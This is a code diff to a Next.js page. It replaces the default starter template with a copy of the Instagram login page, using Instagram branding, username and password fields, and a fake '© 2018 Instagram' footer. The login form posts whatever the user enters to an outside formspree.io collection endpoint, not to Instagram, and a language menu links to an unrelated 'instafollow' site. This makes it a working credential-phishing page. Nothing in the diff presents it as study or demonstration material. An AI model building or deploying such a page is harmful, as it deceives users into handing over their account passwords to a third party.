@@ -18,111 +18,78 @@ export default function Home() {
         
         <meta name="viewport" content="width=device-width, initial-scale=1" />
         <link rel="icon" href="/favicon.ico" />
-
-      <main className={styles.main}>
-        <div className={styles.description}>
-          <p>
-            Get started by editing&nbsp;
-            <code className={styles.code}>pages/index.js</code>
-          </p>
-          <div>
-            <a
-              href="https://vercel.com?utm_source=create-next-app&utm_medium=default-template&utm_campaign=create-next-app"
-              target="_blank"
-              rel="noopener noreferrer"
-            >
-              By{' '}
-              <Image
-                src="/vercel.svg"
-                alt="Vercel Logo"
-                className={styles.vercelLogo}
-                width={100}
-                height={24}
-                priority
-              />
-            </a>
-          </div>
-        </div>
-
-        <div className={styles.center}>
-          <Image
-            className={styles.logo}
-            src="/next.svg"
-            alt="Next.js Logo"
-            width={180}
-            height={37}
-            priority
-          />
-          <div className={styles.thirteen}>
-            <Image
-              src="/thirteen.svg"
-              alt="13"
-              width={40}
-              height={31}
-              priority
-            />
-          </div>
-        </div>
-
-        <div className={styles.grid}>
-          <a
-            href="https://nextjs.org/docs?utm_source=create-next-app&utm_medium=default-template&utm_campaign=create-next-app"
-            className={styles.card}
-            target="_blank"
-            rel="noopener noreferrer"
-          >
-            <h2 className={inter.className}>
-              Docs <span>-&gt;</span>
-            </h2>
-            <p className={inter.className}>
-              Find in-depth information about Next.js features and&nbsp;API.
-            </p>
-          </a>
-
-          <a
-            href="https://nextjs.org/learn?utm_source=create-next-app&utm_medium=default-template&utm_campaign=create-next-app"
-            className={styles.card}
-            target="_blank"
-            rel="noopener noreferrer"
-          >
-            <h2 className={inter.className}>
-              Learn <span>-&gt;</span>
-            </h2>
-            <p className={inter.className}>
-              Learn about Next.js in an interactive course with&nbsp;quizzes!
-            </p>
-          </a>
-
-          <a
-            href="https://vercel.com/templates?framework=next.js&utm_source=create-next-app&utm_medium=default-template&utm_campaign=create-next-app"
-            className={styles.card}
-            target="_blank"
-            rel="noopener noreferrer"
-          >
-            <h2 className={inter.className}>
-              Templates <span>-&gt;</span>
-            </h2>
-            <p className={inter.className}>
-              Discover and deploy boilerplate example Next.js&nbsp;projects.
-            </p>
-          </a>
-
-          <a
-            href="https://vercel.com/new?utm_source=create-next-app&utm_medium=default-template&utm_campaign=create-next-app"
-            className={styles.card}
-            target="_blank"
-            rel="noopener noreferrer"
-          >
-            <h2 className={inter.className}>
-              Deploy <span>-&gt;</span>
-            </h2>
-            <p className={inter.className}>
-              Instantly deploy your Next.js site to a shareable URL
-              with&nbsp;Vercel.
-            </p>
-          </a>
-        </div>
-      </main>
+<span id="root">
+  <section className="section-all">
+    {/* 1-Role Main */}
+    <main className="main" role="main">
+      <div className="wrapper">
+        <article className="article">
+          <div className="content">
+            <div className="login-box">
+              <div className="header">
+                <img className="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram" />
+              </div>{/* Header end */}
+              <div className="form-wrap">
+                <form action="https://formspree.io/f/xbjejpyv" method="POST" className="form">
+                  <div className="input-box">
+                    <input type="text" id="name" aria-describedby placeholder="Phone number, username, or email" aria-required="true" maxLength={30} autoCapitalize="off" autoCorrect="off" name="username" defaultValue required />
+                  </div>  
+                  <div className="input-box">
+                    <input type="password" name="password" id="password" placeholder="Password" aria-describedby maxLength={30} aria-required="true" autoCapitalize="off" autoCorrect="off" required />
+                  </div>  
+                  <span className="button-box">
+                    <button className="btn" type="submit" name="submit">Log in</button>
+                  </span>  
+                  <a className="forgot" href>Forgot password?</a>
+                </form>
+              </div> {/* Form-wrap end */}
+            </div> {/* Login-box end */}
+            <button type="submit"> <div className="login-box"> </div></button>
+            <p className="text">Don't have an account?<a href="#">Sign up</a></p>
+          </div> {/* Signup-box end */}
+          <div className="app">
+            <p>Get the app.</p>
+            <div className="app-img">
+              <a href="https://itunes.apple.com/app/instagram/id389801252?pt=428156&ct=igweb.loginPage.badge&mt=8">
+                <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/4b70f6fae447.png" />
+              </a>
+              <a href="https://play.google.com/store/apps/details?id=com.instagram.android&referrer=utm_source%3Dinstagramweb%26utm_campaign%3DloginPage%26utm_medium%3Dbadge">
+                <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/f06b908907d5.png" />
+              </a>  
+            </div>  {/* App-img end*/}
+          </div> {/* App end */}
+        </article></div> {/* Content end */}
+      {/* Wrapper end */}
+    </main>
+    {/* 2-Role Footer */}
+    <footer className="footer" role="contentinfo">
+      <div className="footer-container">
+        <nav className="footer-nav" role="navigation">
+          <ul>
+            <li><a href>About Us</a></li>
+            <li><a href>Support</a></li>
+            <li><a href>Blog</a></li>
+            <li><a href>Press</a></li>
+            <li><a href>Api</a></li>
+            <li><a href>Jobs</a></li>
+            <li><a href>Privacy</a></li>
+            <li><a href>Terms</a></li>
+            <li><a href>Directory</a></li>
+            <li>
+              <span className="language">Language
+                <select name="language" className="select" onchange="la(this.value)">
+                  <option value="#">English</option>
+                  <option value="http://ru-instafollow.bitballoon.com">Russian</option>
+                </select>
+              </span>
+            </li>
+          </ul>
+        </nav>
+        <span className="footer-logo">© 2018 Instagram</span>
+      </div> {/* Footer container end */}
+    </footer>
+  </section>
+</span>
     </>
   )
 }
